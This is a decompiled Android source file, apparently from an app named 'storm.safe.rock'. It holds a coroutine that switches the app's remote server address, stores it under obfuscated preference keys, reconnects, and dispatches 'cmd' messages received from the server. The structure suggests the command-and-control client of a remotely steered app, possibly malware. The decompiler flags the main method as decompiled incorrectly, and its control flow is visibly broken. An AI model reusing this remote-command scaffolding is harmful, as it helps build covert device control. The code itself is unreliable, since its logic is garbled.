package com.storm.safe.rock.service;

import android.content.Context;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.AbstractC0385a0;
import com.storm.safe.rock.util.StringUtil;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONObject;
import p000.C0873ms;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.h10;
import p000.kg1;
import p000.l10;
import p000.lj0;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$changeServerUrl$1", m214403f = "dqtvuisjd.kt", m214404l = {9278, 9296}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$changeServerUrl$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public C0323a8 f52494a1;

    /* renamed from: a2 */
    public int f52495a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f52496a3;

    /* renamed from: a4 */
    public final /* synthetic */ dqtvuisjd f52497a4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$changeServerUrl$1(InterfaceC0876mv interfaceC0876mv, dqtvuisjd dqtvuisjdVar, String str) {
        super(2, interfaceC0876mv);
        this.f52496a3 = str;
        this.f52497a4 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$changeServerUrl$1(interfaceC0876mv, this.f52497a4, this.f52496a3);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$changeServerUrl$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    /* JADX WARN: Removed duplicated region for block: B:28:0x00b5 A[Catch: Exception -> 0x001b, TryCatch #0 {Exception -> 0x001b, blocks: (B:7:0x0016, B:26:0x00b1, B:28:0x00b5, B:29:0x00bf, B:13:0x0026, B:22:0x0078, B:16:0x002d, B:18:0x0065, B:19:0x0068), top: B:34:0x000e }] */
    /* JADX WARN: Removed duplicated region for block: B:29:0x00bf A[Catch: Exception -> 0x001b, TRY_LEAVE, TryCatch #0 {Exception -> 0x001b, blocks: (B:7:0x0016, B:26:0x00b1, B:28:0x00b5, B:29:0x00bf, B:13:0x0026, B:22:0x0078, B:16:0x002d, B:18:0x0065, B:19:0x0068), top: B:34:0x000e }] */
    /* JADX WARN: Type inference failed for: r4v4, types: [com.storm.safe.rock.service.dqtvuisjd$changeServerUrl$1$2, kotlin.jvm.internal.Lambda] */
    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0323a8 c0323a8;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52495a2;
        try {
        } catch (Exception e) {
            t60.m214705c6("dqtvuisjd", "❌ 修改服务器地址失败", e);
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            t60.m214714d6("dqtvuisjd", "🌐 开始修改服务器地址: ".concat(this.f52496a3));
            this.f52497a4.getApplicationContext().getSharedPreferences(StringUtil.m212470a0("OEACLkg1MyZSPTtcAwVePRg6Xj8sSg=="), 0).edit().putString(StringUtil.m212470a0("OFwDLEgqMztFPQ=="), this.f52496a3).apply();
            t60.m214714d6("dqtvuisjd", "✅ 新服务器地址已保存到 SharedPreferences");
            C0323a8 c0323a82 = this.f52497a4.f52415e6;
            if (c0323a82 != null) {
                c0323a82.m211638a3();
            }
            t60.m214714d6("dqtvuisjd", "已断开当前服务器连接");
            this.f52495a2 = 1;
            if (b81.m210571b1(500L, this) == coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (i != 1) {
            if (i != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            c0323a8 = this.f52494a1;
            kg1.m213544f4(obj);
            if (c0323a8.f53103a3) {
                t60.m214726f4("dqtvuisjd", "⚠️ 连接新服务器超时，将继续尝试重连");
            } else {
                t60.m214714d6("dqtvuisjd", "✅ 已成功连接到新服务器: ".concat(this.f52496a3));
            }
            return C1351vv.f60710b1;
        }
        kg1.m213544f4(obj);
        lj0 lj0Var = C0323a8.f53097e0;
        Context applicationContext = this.f52497a4.getApplicationContext();
        t60.m214694b5(applicationContext, "applicationContext");
        C0323a8 orCreate = lj0Var.getOrCreate(applicationContext);
        final dqtvuisjd dqtvuisjdVar = this.f52497a4;
        dqtvuisjdVar.f52415e6 = orCreate;
        ?? r4 = new h10() { // from class: com.storm.safe.rock.service.dqtvuisjd$changeServerUrl$1.2

            /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
            @InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$changeServerUrl$1$2$1", m214403f = "dqtvuisjd.kt", m214404l = {9285}, m214405m = "invokeSuspend")
            /* renamed from: com.storm.safe.rock.service.dqtvuisjd$changeServerUrl$1$2$1, reason: invalid class name */
            final class AnonymousClass1 extends SuspendLambda implements l10 {

                /* renamed from: a1 */
                public int f52499a1;

                /* renamed from: a2 */
                public final /* synthetic */ dqtvuisjd f52500a2;

                /* renamed from: a3 */
                public final /* synthetic */ JSONObject f52501a3;

                /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                public AnonymousClass1(dqtvuisjd dqtvuisjdVar, JSONObject jSONObject, InterfaceC0876mv interfaceC0876mv) {
                    super(2, interfaceC0876mv);
                    this.f52500a2 = dqtvuisjdVar;
                    this.f52501a3 = jSONObject;
                }

                @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
                    return new AnonymousClass1(this.f52500a2, this.f52501a3, interfaceC0876mv);
                }

                @Override // p000.l10
                public final Object invoke(Object obj, Object obj2) {
                    return ((AnonymousClass1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
                }

                @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
                public final Object invokeSuspend(Object obj) throws Throwable {
                    CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
                    int i = this.f52499a1;
                    if (i == 0) {
                        kg1.m213544f4(obj);
                        this.f52499a1 = 1;
                        if (dqtvuisjd.m211411b0(this.f52500a2, this.f52501a3, this) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                    } else {
                        if (i != 1) {
                            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                        }
                        kg1.m213544f4(obj);
                    }
                    return C1351vv.f60710b1;
                }
            }

            {
                super(1);
            }

            @Override // p000.h10
            public final Object invoke(Object obj2) {
                JSONObject jSONObject = (JSONObject) obj2;
                t60.m214695b6(jSONObject, "cmd");
                C0873ms c0873ms = AbstractC0385a0.f55229a0;
                AbstractC0385a0.m212471a0(new AnonymousClass1(dqtvuisjdVar, jSONObject, null));
                return C1351vv.f60710b1;
            }
        };
        orCreate.getClass();
        orCreate.f53117b7 = r4;
        orCreate.m211669d6();
        t60.m214714d6("dqtvuisjd", "🌐 服务器地址修改完成，正在连接到: ".concat(this.f52496a3));
        this.f52494a1 = orCreate;
        this.f52495a2 = 2;
        if (b81.m210571b1(3000L, this) != coroutineSingletons) {
            c0323a8 = orCreate;
            if (c0323a8.f53103a3) {
            }
            return C1351vv.f60710b1;
        }
        return coroutineSingletons;
    }
}
